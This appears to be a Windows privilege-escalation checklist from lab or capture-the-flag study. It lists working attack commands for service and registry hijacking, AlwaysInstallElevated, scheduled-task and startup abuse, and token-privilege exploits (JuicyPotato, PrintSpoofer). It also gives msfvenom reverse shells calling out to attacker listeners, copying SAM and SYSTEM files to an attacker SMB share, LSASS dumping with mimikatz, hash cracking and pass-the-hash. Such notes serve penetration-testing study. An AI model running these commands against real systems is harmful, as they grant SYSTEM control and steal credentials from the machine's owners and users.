# Checklist

* **Insecure Service Permissions**
  * [ ] collect all service have Write permission `accesschk.exe /accepteula -uwcqv <userAccount> * > services.txt`
  * [ ] search on permission for services u collected `sc qc <ServiceName>`
  * [ ] note u have `SERVICE_START_NAME` and `SERVICE_CHANGE_CONFIG` to edit binary path and restart service
  * [ ] edit binary path for service `sc config <serviceN> binpath= "\"C:\PrivEsc\reverse.exe\""`
  * [ ] then start service again `net start <ServiceName>`
*   **Unquoted Service Path**

    when you check service permission we will notice path of this service have spaces and doesn’t have any quotes

    * [ ] to check this misconfiguration`sc qc unquotedsvc`
    * [ ] check write permission on path for this service `accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\”`
    * [ ] copy reverse shell to this Dir `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe”`
    * [ ] restart service `net start unquotedsvc`
* **Weak Registry Permissions**
  * [ ] `sc qc regsvc`
  *   [ ] check service permission in register `accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

      we found have writable perm by "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)
  * [ ] edit ImagePath registry key to point to the reverse.exe `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
  * [ ] `net start regsvc`
* **Insecure Service Executables**
  * [ ] `sc qc filepermsvc` - note that it runs with SYSTEM privileges (SERVICE\_START\_NAME)
  * [ ] check permission for this service `accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe”` we found file is writable by everyone
  * [ ] replace reverse shell with program `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
  * [ ] `net start filepermsvc`
* **AutoRuns**
  * [ ] collect auto run app `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
  * [ ] check writable for everyone `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
  * [ ] replace current program with reverse shell
*   **AlwaysInstallElevated**

    any program will be run with system priv

    *   [ ] check always two registry for AlwaysInstallElevated keys enabled

        `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

        `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    * [ ] create a reverse shell `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
    * [ ] run reverse shell `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
* **Passwords - Registry**
  * [ ] search for password in register `reg query HKLM /f password /t REG_SZ /s`
  * [ ] find admin AutoLogon credentials `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
  * [ ] spawn cmd with admin privilege `winexe -U 'admin%password' //10.10.179.163 cmd.exe` or `runas /user:userName cmd`
* **Passwords - Saved Creds**
  * [ ] list saved cred `cmdkey /list`
  * [ ] run shell with saved credential `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
* **Passwords - Security Account Manager (SAM)**
  *   [ ] search on any backup for SAM file `dir C:\ /s /b | findstr /i "\SAM"`

      we can find SAM file in 2 path `c:\Windows\System32\config\SAM` other for backup `C:\Windows\Repair\SAM`
  *   [ ] we found we have RW perm for backup file

      `copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`

      `copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
  * [ ] extract hashes `python3 creddump7/pwdump.py SYSTEM SAM`
  * [ ] crack hash `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
* **Passwords - Passing the Hash**
  * [ ] `pth-winexe -U 'admin%hash' //10.10.130.136 cmd.exe`
  * [ ] `crackmapexec smb 10.10.130.136 -u admin -H <NTLM_HASH> --exec 'whoami'`
* **Scheduled Tasks**
  * [ ] discover folders like `C:\DevTools\` , `C:\ProgramData\`, `C:\Windows\Tasks\` , `C:\Users\Public\`
  * [ ] view the content of file `type C:\DevTools\CleanUp.ps1`
  * [ ] when check we found have write perm `accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1` or using `icacls C:\DevTools\CleanUp.ps1` we found have Modify perm
  * [ ] modify the content of file `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
*   **Insecure GUI Apps**

    exploit program run with admin priv

    * [ ] check priv of program in tasklist after run it `tasklist /V | findstr mspaint.exe`
*   **Startup Apps**

    exploit Write privilege in startup folder to take the same privilege for logged user

    * [ ] check priv `accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp”`
    *   [ ] create a shortcut (.lnk) refer to reverse shell in startup folder

        `cscript C:\PrivEsc\CreateShortcut.vbs`
    * [ ] login with admin credential
*   **SeImpersonatePrivilege**

    exploit local service account - SeAssignPrimaryTokenPrivilege

    * [ ] check this privilege is enabled `whoami /priv`
    * [ ] create reverse shell `msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.212 lport=1111 > 1.bat`
    * [ ] exploit `.\JuicyPotato.exe -l 5337 -p C:\Users\Public\1.bat -t * -clisd "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"`
*   **SeImpersonatePrivilege - 0X1**

    exploit local service account - SeImpersonatePrivilege

    * [ ] check this privilege is enabled `whoami /priv`
    * [ ] exploit it using PrintSpoofer `PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
* **SeDebugPrivilege**
  * [ ] check privilege is found `whoami /priv` we found SeDebugPrivilege but it’s disable
  *   [ ] use ProcDump to dump hashes from LSASS if it’s disabled

      `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
  * [ ] Access Hashed using mimikatz `log` , `sekurlsa::minidump lsass.dmp` , `sekurlsa::logonpasswords`
  * [ ] \[ ]
*   **SeTakeOwnershipPrivilege**

    This privilege assigns WRITE\_OWNER rights over an object, that’s meaning user can change owner in Security Descriptor for this object

    * [ ] check privilege `whoami /priv` we found SeTakeOwnershipPrivilege
    * [ ] Enabling `Import-Module .\Enable-Privilege.ps1` , `.\EnableAllTokenPrivs.ps1`
    * [ ] choose any file u can’t access it
    * [ ] check file ownership `Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`
    * [ ] if not found try folder ownership `cmd /c dir /q 'C:\Department Shares\Private\IT'`
    * [ ] take ownership for file `takeown /f 'C:\Department Shares\Private\IT\cred.txt'`
    * [ ] Modifying the File ACL `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`
    *   [ ] files interests

        ```
        c:\inetpub\wwwwroot\web.config
        %WINDIR%\repair\sam
        %WINDIR%\repair\system
        %WINDIR%\repair\software, %WINDIR%\repair\security
        %WINDIR%\system32\config\SecEvent.Evt
        %WINDIR%\system32\config\default.sav
        %WINDIR%\system32\config\security.sav
        %WINDIR%\system32\config\software.sav
        %WINDIR%\system32\config\system.sav
        ```
